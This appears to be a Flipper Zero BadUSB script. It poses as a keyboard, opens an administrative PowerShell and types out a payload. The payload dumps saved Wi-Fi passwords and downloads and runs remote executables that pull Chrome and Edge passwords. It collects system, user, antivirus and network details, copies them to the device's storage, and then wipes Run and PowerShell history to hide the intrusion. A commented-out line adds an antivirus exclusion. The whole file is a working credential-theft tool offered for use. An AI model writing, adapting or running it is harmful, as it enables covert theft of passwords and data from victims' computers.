// MassStorage Name
let image = "/ext/apps_data/mass_storage/Exfil.img";
// MassStorage Size
let size = 8 * 1024 * 1024;

// Le Script
let script = [
    "$Date = Get-Date -Format yyyy-MM-dd;", // Get Date
    "$Time = Get-Date -Format hh-mm-ss;", // Get Time
    "netsh wlan show profiles name=* key=clear >> stats.txt;", // Get WiFi profiles with passwords
    "$currentDirectory = Get-Location;",
    /* "try { Add-MpPreference -ExclusionPath $currentDirectory.Path; } catch { Write-Output 'Failed to add exclusion'; }", // Add exclusion with error handling */
    // Chrome password extraction
    "$chromeExeUrl = 'https://github.com/luciferseamus/FlIpPeR_iSh/blob/main/chrome.exe';", // URL of the Chrome executable
    "$chromeExePath = '.\\chrome.exe';", // Path where the Chrome executable will be saved in the current directory
    "if (-not (Test-Path -Path $chromeExePath)) {Invoke-WebRequest -Uri $chromeExeUrl -OutFile $chromeExePath;}", // Download the Chrome executable if it doesn't exist
    "$chromeOutput = & \"$chromeExePath\" | Out-String;", // Execute the Chrome command and capture the output
    "$chromeOutput | Out-File -FilePath stats.txt -Append;", // Save the Chrome output to a file
    "Remove-Item $chromeExePath;", // Delete the Chrome executable after use
    // Edge password extraction
    "$edgeExeUrl = 'https://github.com/luciferseamus/FlIpPeR_iSh/blob/main/edge.exe';", // URL of the Edge executable
    "$edgeExePath = '.\\edge.exe';", // Path where the Edge executable will be saved in the current directory
    "if (-not (Test-Path -Path $edgeExePath)) {Invoke-WebRequest -Uri $edgeExeUrl -OutFile $edgeExePath;}", // Download the Edge executable if it doesn't exist
    "$edgeOutput = & \"$edgeExePath\" | Out-String;", // Execute the Edge command and capture the output
    "$edgeOutput | Out-File -FilePath stats.txt -Append;", // Save the Edge output to a file
    "Remove-Item $edgeExePath;", // Delete the Edge executable after use
    // Collect system information
    "Get-CimInstance -ClassName Win32_ComputerSystem >> stats.txt;", // Listing computer manufacturer and model
    "Get-LocalUser >> stats.txt;", // List users on the system
    "Get-LocalUser | Where-Object -Property PasswordRequired -Match false >> stats.txt;", // Which users have password required set to false
    "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct >> stats.txt;", // List which AntiVirus Product is being used
    "Get-CimInstance -ClassName Win32_QuickFixEngineering >> stats.txt;", // Listing installed hotfixes
    "(netsh wlan show profiles) | Select-String ':(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)}  | Select-String 'Key Content\\W+\\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize >> stats.txt;", // Get network profiles with passwords
    "dir env: >> stats.txt;", // Check ENV
    "Get-ComputerInfo >> stats.txt;", // Computer Info
    "Get-Service >> stats.txt;", // Get running services
    "Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\\d+.\\d+)' >> stats.txt;", // Check all IPV4 suffix that is not localhost
    "Get-NetTCPConnection | Select-Object -Property * >> stats.txt;", // Get TCP information, ports, state etc.
    "Get-Process | Sort-Object CPU -Descending | Select-Object -First 10 >> stats.txt;", // Get top 10 processes by CPU usage
    "Get-EventLog -LogName System -Newest 50 >> stats.txt;", // Get the latest 50 system event logs
    "Get-HotFix >> stats.txt;", // List all installed hotfixes
    "Get-Volume >> stats.txt;", // Get volume information
    "Get-Process | Select-Object -Property Name,Id,Path,StartTime,Company,FileVersion >> stats.txt;", // List all running processes with detailed info
];

// Script crawler
let command = "";
for (let i = 0; i < script.length; i++) {
    command += script[i];
}

// Requirements
let badusb = require("badusb");
let usbdisk = require("usbdisk");
let storage = require("storage");

// Check if MassStorage image exists...
print("Checking for Image...");
if (storage.exists(image)) {
    print("Storage Exists.");
} else {
    print("Creating Storage...");
    usbdisk.createImage(image, size);
}

// VID&PID as HID
badusb.setup({ vid: 0xAAAA, pid: 0xBBBB, mfr_name: "Flipper", prod_name: "Zero" });
print("Waiting for connection");

// Keep Connected
while (!badusb.isConnected()) {
    delay(2000);
}

// Program Start!!
badusb.press("GUI", "x"); // Open admin tools menu
delay(300);
badusb.press("i"); // Select PowerShell
delay(3000);
// Uncomment this to work with "Run", also comment the 1st part that works with the admin tools menu
/*
badusb.press("GUI", "r"); // Open Run
delay(300);
badusb.println("powershell");
badusb.press("ENTER");
*/
print("Running payload");
badusb.println(command, 10); // Run Script Crawler
badusb.press("ENTER");
// Added commands below to delete stats.txt after copying to the flipper, then delete the run dialog and PowerShell history for a clean exfil
badusb.println("echo 'Please wait until this Window closes to eject the disk!'; Start-Sleep 30; $DriveLetter = Get-Disk -FriendlyName 'Flipper Mass Storage' | Get-Partition | Get-Volume | Select-Object -ExpandProperty DriveLetter; New-Item -ItemType Directory -Force -Path ${DriveLetter}:\\${Date}\\; Move-Item -Path stats.txt -Destination ${DriveLetter}:\\${Date}\\${env:computername}_${Time}.txt; Remove-Item stats.txt; reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f; Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue; exit");
badusb.press("ENTER");
badusb.quit();
delay(2000);
usbdisk.start(image); // Open MassStorage Folder
print("Please wait until PowerShell window closes to eject...");
delay(9000);
delay(9000);
delay(9000);
delay(9000);
// Ejected check
while (!usbdisk.wasEjected()) {
    delay(1000);
}
// Stop Script
usbdisk.stop();
print("Done");
